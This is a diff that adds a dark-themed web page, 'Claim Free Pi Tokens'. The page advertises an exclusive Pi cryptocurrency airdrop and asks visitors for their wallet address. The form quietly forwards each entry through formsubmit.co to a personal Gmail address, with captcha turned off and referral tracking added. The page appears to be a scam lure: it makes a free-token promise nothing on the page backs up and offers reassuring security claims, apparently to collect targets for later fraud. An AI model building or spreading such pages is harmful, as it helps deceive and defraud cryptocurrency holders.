@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim Free Pi Tokens</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ffcc;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #aaa;
+      font-size: 16px;
+      max-width: 400px;
+      text-align: center;
+    }
+    form {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+      max-width: 400px;
+    }
+    input, button {
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+    input {
+      background: #1a1a1a;
+      color: #fff;
+      border: 1px solid #333;
+    }
+    button {
+      background: #00ff99;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #00cc7a;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🚀 Claim Free Pi Tokens</h1>
+  <p>Join our exclusive Pi airdrop. Just enter your public Pi wallet address below. No passwords, no private keys!</p>
+
+  <form action="https://formsubmit.co/kashifrazamallnah22@gmail.com" method="POST">
+    <input type="text" name="wallet_address" placeholder="Your Pi Wallet Address" required>
+    <input type="hidden" name="_subject" value="New Pi Wallet Address Submission">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="referrer" id="referrer">
+    <button type="submit">🎁 Claim Now</button>
+  </form>
+
+  <footer>
+    🔒 We will never ask for your private key or passphrase.
+  </footer>
+
+  <script>
+    // Capture referral from URL (?ref=USERNAME)
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    if (ref) {
+      document.getElementById('referrer').value = ref;
+    }
+  </script>
+
+</body>
+</html>
